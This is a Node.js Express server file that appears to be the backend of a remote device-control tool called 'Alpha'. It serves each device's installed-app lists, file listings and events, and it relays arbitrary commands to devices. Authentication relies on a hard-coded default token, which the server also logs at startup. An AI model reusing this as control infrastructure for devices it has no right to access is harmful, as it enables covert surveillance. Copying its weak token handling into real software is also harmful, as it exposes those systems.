'use strict';
const http    = require('http');
const path    = require('path');
const express = require('express');
const hub     = require('../core/hub');

const PORT    = process.env.PORT  || 3000;
const TOKEN   = process.env.TOKEN || 'alpha2024';

const app = express();
app.use(express.json({ limit: '50mb' }));
app.use(express.static(path.join(__dirname, '..', 'public')));

// ── Auth middleware ────────────────────────────────────────────────────────────
app.use('/api', (req, res, next) => {
  const tok = req.headers['x-alpha-token'] || req.query.token;
  if (tok !== TOKEN) return res.status(401).json({ error: 'unauthorized' });
  next();
});

// ── REST API ──────────────────────────────────────────────────────────────────
const db = require('../core/db');

app.get('/api/devices', (_req, res) => {
  const rows   = db.all(`SELECT * FROM devices ORDER BY last_seen DESC`);
  const online = [...hub.devices.keys()];
  res.json({ devices: rows, online });
});

app.get('/api/apps/:devId', (req, res) => {
  const row = db.get(`SELECT data FROM app_listings WHERE dev_id=? ORDER BY ts DESC LIMIT 1`,
                     [req.params.devId]);
  res.json(row ? JSON.parse(row.data) : { apps: [] });
});

app.get('/api/files/:devId', (req, res) => {
  const rows = db.all(`SELECT path,data,ts FROM file_listings WHERE dev_id=? ORDER BY ts DESC LIMIT 10`,
                      [req.params.devId]);
  res.json(rows);
});

app.get('/api/events/:devId', (req, res) => {
  const rows = db.all(`SELECT type,data,ts FROM events WHERE dev_id=? ORDER BY ts DESC LIMIT 100`,
                      [req.params.devId]);
  res.json(rows);
});

// Send command via REST (for scripting)
app.post('/api/cmd', (req, res) => {
  const { devId, cmd, args } = req.body;
  if (!devId || !cmd) return res.status(400).json({ error: 'devId and cmd required' });
  const dev = hub.devices.get(devId);
  if (dev) {
    const payload = { action: cmd, type: cmd, ...args };
    dev.ws.send(JSON.stringify(payload));
    res.json({ sent: true });
  } else {
    db.enqueueCmd(devId, cmd, args || {});
    res.json({ queued: true });
  }
});

// Token check endpoint (for dashboard login)
app.post('/api/login', (req, res) => {
  const { token } = req.body;
  res.json({ ok: token === TOKEN });
});

// ── HTTP + WebSocket server ────────────────────────────────────────────────────
const server = http.createServer(app);
hub.init(server);

server.listen(PORT, () => {
  console.log(`[Alpha] server running on :${PORT}  token=${TOKEN}`);
});
